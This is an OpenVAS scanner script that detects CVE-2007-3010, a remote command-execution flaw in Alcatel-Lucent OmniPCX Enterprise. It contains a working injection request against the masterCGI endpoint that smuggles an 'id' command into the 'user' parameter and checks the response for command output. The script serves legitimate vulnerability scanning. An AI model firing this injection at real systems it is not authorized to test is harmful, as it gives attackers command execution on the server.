###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_alcatel_lucent_omnipcx_25694.nasl 11355 2018-09-12 10:32:04Z asteins $
#
# Alcatel-Lucent OmniPCX Enterprise Remote Command Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103480");
  script_bugtraq_id(25694);
  script_cve_id("CVE-2007-3010");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 11355 $");

  script_name("Alcatel-Lucent OmniPCX Enterprise Remote Command Execution Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/25694");
  script_xref(name:"URL", value:"http://www1.alcatel-lucent.com/enterprise/en/products/ip_telephony/omnipcxenterprise/index.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/479699");
  script_xref(name:"URL", value:"http://www1.alcatel-lucent.com/psirt/statements/2007002/OXEUMT.htm");

  script_tag(name:"last_modification", value:"$Date: 2018-09-12 12:32:04 +0200 (Wed, 12 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-04-26 13:55:46 +0200 (Thu, 26 Apr 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"solution", value:"The vendor has released an advisory along with fixes to address this
issue. Please see the referenced advisory for information on
obtaining fixes.");
  script_tag(name:"summary", value:"Alcatel-Lucent OmniPCX Enterprise is prone to a remote command-
execution vulnerability because it fails to adequately sanitize user-
supplied data.");

  script_tag(name:"impact", value:"Attackers can exploit this issue to execute arbitrary commands with
the privileges of the 'httpd' user. Successful attacks may facilitate
a compromise of the application and underlying webserver, other
attacks are also possible.");

  script_tag(name:"affected", value:"Alcatel-Lucent OmniPCX Enterprise R7.1 and prior versions are
vulnerable to this issue.");

  script_tag(name:"solution_type", value:"VendorFix");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

url = "/index.html";
buf = http_get_cache(port:port, item:url);

if("<title>OmniPCX" >< buf) {

  url = '/cgi-bin/masterCGI?ping=nomip&user=;id;';

  if(http_vuln_check(port:port, url:url,pattern:"uid=[0-9]+.*gid=[0-9]+.*",check_header:TRUE)) {
    security_message(port:port);
    exit(0);
  } else {
    exit(99);
  }
}

exit(0);
